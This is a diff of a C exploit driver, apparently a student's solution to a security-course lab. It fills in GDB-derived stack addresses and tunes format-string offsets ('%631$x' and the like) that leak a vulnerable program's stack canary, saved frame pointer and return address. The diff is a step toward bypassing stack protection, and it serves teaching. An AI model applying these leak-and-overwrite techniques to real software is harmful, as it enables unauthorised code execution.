@@ -127,17 +127,18 @@ int main(int argc, char* argv[]) {
 
    // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
    // to figure out and populate the following values
-   void *mainloop_ra = 0x0804a266; // return address for main_loop
-   void *mainloop_bp = 0xbf991388; // saved ebp for main_loop
-   void *auth_ra = 0x08048968;     // return address for auth
-   void *auth_bp = 0xbf990a48;     // saved ebp for auth function
+   void *mainloop_ra = 0x0804b652; // `return address for main_loop
+   void *mainloop_bp = 0xbffff008; // `saved ebp for main_loop
+   void *auth_ra = 0x08048968;     // `return address for auth
+   void *auth_bp = 0xbfffe5e8;     // `saved ebp for auth function
 
    // The following refer to locations on the stack
-   void *g_authd = 0xbf990a34;     // location of authd variable of g
-   void *auth_ra_loc = 0xbf990a1c; // location of auth's return address
-   void *auth_bp_loc = 0xbf990a18; // location of auth's saved bp
-   void *auth_canary_loc = 0xbf990a0c; // location where auth's canary is stored
-   void *auth_user = 0xbf9908b0;   // value of user variable in auth
+   void *g_authd = 0xbfffe5d4;     // `location of authd variable of g
+   void *auth_ra_loc = 0xbfffe5bc; // `location of auth's return address
+   void *auth_bp_loc = 0xbfffe5b8; // `location of auth's saved bp   
+   void *auth_canary_loc = 0xbfffe5ac; // `location where auth's canary is stored
+   void *auth_user = 0xbfffe3a0;   // `value of user variable in auth
+            // OR  = 0xbfffe5a4 (address of that value)
 
    // These values discovered above using GDB will vary across the runs, but the
    // differences between similar variables are preserved, so we compute those.
@@ -149,11 +150,16 @@ int main(int argc, char* argv[]) {
    unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
    unsigned g_authd_auth_user_diff = g_authd - auth_user;
 
-   // Use GDB + trial&error to figure out the correct offsets where the the
-   // stack canary, the saved ebp value, and the return address for the
-   // main_loop function are stored. Use those offsets in the place of the
-   // numbers in the format string below.
-   put_str("e %575$x %578$x %579$x\n");
+   // Use GDB + trial&error to figure out the correct offsets where the:
+   // the stack canary
+   // the saved ebp value, and 
+   // the return address for the main_loop function are stored. 
+   // Use those offsets in the place of the numbers in the format string below.
+   // FOUND USING: p (int)($ebp-$esp)/4 with GDB in main_loop
+   //    after passing all allocs. This yielded 630, and using vuln's
+   //    echo command, I tried values around 630 using 'e %630$x' and
+   //    eventually found the offsets that yielded the canary, BP, and RA.
+   put_str("e %631$x %634$x %635$x\n");
    send();
 
    // Once all of the above information has been populated, you are ready to run
